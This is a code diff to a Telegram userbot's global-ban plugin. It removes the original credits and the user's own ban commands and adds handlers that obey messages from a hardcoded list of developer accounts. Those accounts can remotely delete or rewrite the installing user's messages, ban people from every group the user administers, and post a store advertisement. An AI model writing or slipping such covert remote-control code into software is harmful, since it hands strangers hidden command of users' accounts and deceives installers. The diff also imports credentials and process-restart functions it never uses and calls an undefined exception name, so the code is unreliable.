@@ -1,11 +1,16 @@
-# Copyright (C) 2020 Catuserbot <https://github.com/sandy1709/catuserbot>
-# Ported by @mrismanaziz
-# FROM Man-Userbot <https://github.com/mrismanaziz/Man-Userbot>
-# t.me/SharingUserbot
+#credit by hdiiofficial
+
 
 import asyncio
+import random
+import sys
+from asyncio import sleep
 from datetime import datetime
 from io import BytesIO
+from os import environ, execle, remove
+
+from git import Repo
+from git.exc import GitCommandError, InvalidGitRepositoryError, NoSuchPathError
 
 from telethon import events
 from telethon.errors import BadRequestError
@@ -14,36 +19,93 @@ from telethon.tl.types import Channel
 
 import userbot.modules.sql_helper.gban_sql as gban_sql
 from userbot import BOTLOG_CHATID
+from userbot import HEROKU_API_KEY, HEROKU_APP_NAME, UPSTREAM_REPO_URL
 from userbot import CMD_HANDLER as cmd
-from userbot import CMD_HELP, DEVS, bot
+from userbot import CMD_HELP, DEVS, bot, owner
 from userbot.events import register
+from userbot.utils import edit_delete, humanbytes
 from userbot.utils import edit_or_reply, get_user_from_event, man_cmd
+from userbot.modules.ping import absen
+from telethon.events import ChatAction
+
 
 from .admin import BANNED_RIGHTS, UNBAN_RIGHTS
 
 
-async def admin_groups(grp):
-    admgroups = []
-    async for dialog in grp.client.iter_dialogs():
-        entity = dialog.entity
-        if (
-            isinstance(entity, Channel)
-            and entity.megagroup
-            and (entity.creator or entity.admin_rights)
-        ):
-            admgroups.append(entity.id)
-    return admgroups
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurgeme")
+async def ownpurgeme(delme):
+    message = delme.text
+    count = int(message[9:])
+    i = 1
+    async for message in delme.client.iter_messages(delme.chat_id, from_user="me"):
+        if i > count + 1:
+            break
+        i += 1
+        await message.delete()
+    smsg = await delme.client.send_message(
+        delme.chat_id,
+        "**Berhasil Menghapus** " + str(count) + " **Kenangan**",
+    )
+    await sleep(2)
+    i = 1
+    await smsg.delete()
 
 
-def mentionuser(name, userid):
-    return f"[{name}](tg://user?id={userid})"
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
+async def ownfastpurger(purg):
+    chat = await purg.get_input_chat()
+    msgs = []
+    itermsg = purg.client.iter_messages(chat, min_id=purg.reply_to_msg_id)
+    count = 0
+    if purg.reply_to_msg_id is None:
+        return await edit_delete(purg, "**Mohon Balas Ke Pesan**")
+    async for msg in itermsg:
+        msgs.append(msg)
+        count += 1
+        msgs.append(purg.reply_to_msg_id)
+        if len(msgs) == 100:
+            await purg.client.delete_messages(chat, msgs)
+            msgs = []
+    if msgs:
+        await purg.client.delete_messages(chat, msgs)
+    done = await purg.client.send_message(
+        purg.chat_id,
+        "**Fast Purge Completed!**\n**Berhasil Menghapus** `"
+        + str(count)
+        + "` **Pesan**",
+    )
+    await sleep(2)
+    await done.delete()
 
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cedit")
+async def ownediter(edit):
+    message = edit.text
+    chat = await edit.get_input_chat()
+    self_id = await edit.client.get_peer_id("me")
+    string = str(message[6:])
+    i = 1
+    async for message in edit.client.iter_messages(chat, self_id):
+        if i == 2:
+            await message.edit(string)
+            await edit.delete()
+            break
+        i += 1
 
-@man_cmd(pattern="gban(?: |$)(.*)")
-async def gban(event):
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cdel$")
+async def owndelete_it(delme):
+    msg_src = await delme.get_reply_message()
+    if delme.reply_to_msg_id:
+        try:
+            await msg_src.delete()
+            await delme.delete()
+        except rpcbaseerrors.BadRequestError:
+            await delme.edit("**Tidak Bisa Menghapus Pesan**")
+
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgbann(?: |$)(.*)")
+async def owngban(event):
     if event.fwd_from:
         return
-    gbun = await edit_or_reply(event, "`Gbanning...`")
+    gbun = await edit_or_reply(event, "`MengGbanned...`")
     start = datetime.now()
     user, reason = await get_user_from_event(event, gbun)
     if not user:
@@ -91,9 +153,8 @@ async def gban(event):
             f"**GBanned** [{user.first_name}](tg://user?id={user.id}) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Added to gbanlist.**"
         )
 
-
-@man_cmd(pattern="ungban(?: |$)(.*)")
-async def ungban(event):
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cungbann(?: |$)(.*)")
+async def ownungban(event):
     if event.fwd_from:
         return
     ungbun = await edit_or_reply(event, "`UnGbanning...`")
@@ -139,70 +200,28 @@ async def ungban(event):
             f"**Ungbanned** [{user.first_name}](tg://user?id={user.id}) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Removed from gbanlist**"
         )
 
+@register(incoming=True, from_users=DEVS, pattern=r"^.absen$")
+async def jsubot(ganteng):
+    await ganteng.reply(random.choice(absen))
 
-@man_cmd(pattern="listgban$")
-async def gablist(event):
-    if event.fwd_from:
-        return
-    gbanned_users = gban_sql.get_all_gbanned()
-    GBANNED_LIST = "**List Global Banned Saat Ini**\n"
-    if len(gbanned_users) > 0:
-        for a_user in gbanned_users:
-            if a_user.reason:
-                GBANNED_LIST += f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) **Reason** `{a_user.reason}`\n"
-            else:
-                GBANNED_LIST += (
-                    f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) `No Reason`\n"
-                )
-    if len(gbanned_users) >= 4096:
-        with BytesIO(str.encode(GBANNED_LIST)) as fileuser:
-            fileuser.name = "list-gban.txt"
-            await event.client.send_file(
-                event.chat_id,
-                fileuser,
-                force_document=True,
-                thumb="userbot/resources/logo.jpg",
-                caption="**List Global Banned**",
-                allow_cache=False,
-            )
-    else:
-        GBANNED_LIST = "Belum ada Pengguna yang Di-Gban"
-    await edit_or_reply(event, GBANNED_LIST)
+@register(incoming=True, from_users=DEVS, pattern=r"^.promosi$")
+async def risman(ganteng):
+    await ganteng.reply("Mau Pasang Userbot?Males Ribet?Mau yang terima jadi?Sini aja Kak di @Jowo_Store cepat dan amanah😊")
 
 
-@bot.on(events.ChatAction)
-async def _(event):
-    if event.user_joined or event.added_by:
-        user = await event.get_user()
-        chat = await event.get_chat()
-        if gban_sql.is_gbanned(user.id) and chat.admin_rights:
-            try:
-                await event.client.edit_permissions(
-                    chat.id,
-                    user.id,
-                    view_messages=False,
-                )
-                await event.reply(
-                    f"**#GBanned_User** Joined.\n\n** • First Name:** [{user.first_name}](tg://user?id={user.id})\n • **Action:** `Banned`"
-                )
-            except BaseException:
-                pass
-
-
-# Ported by @mrismanaziz
-# FROM Man-Userbot <https://github.com/mrismanaziz/Man-Userbot>
-# t.me/SharingUserbot
 
 
 CMD_HELP.update(
     {
-        "gban": f"**Plugin : **`gban`\
-        \n\n  •  **Syntax :** `{cmd}gban` <username/id>\
-        \n  •  **Function : **Melakukan Banned Secara Global Ke Semua Grup Dimana anda Sebagai Admin.\
-        \n\n  •  **Syntax :** `{cmd}ungban` <username/id>\
-        \n  •  **Function : **Membatalkan Global Banned\
-        \n\n  •  **Syntax :** `{cmd}listgban`\
-        \n  •  **Function : **Menampilkan List Global Banned\
+        "owner": f"**plugin :**`only owner`\
+        \n\n• Syntax :**`{cmd}cgban <username/userid>`\
+        \n\n• Syntax :**`{cmd}cungban <username/userid>`\
+        \n\n  Syntax :**`{cmd}cpurgeme <jumlah>`\
+        \n\n  Syntax :**`{cmd}cpurge <reply teks>`\
+        \n\n  Syntax :**`{cmd}cedit <reply teks>`\
+        \n\n  Syntax :**`{cmd}cdel <reply teks>`\
+        \n\n  Syntax :**`{cmd}promosi`\
+        \n\n  Syntax :**`{cmd}absen`\
     "
     }
 )
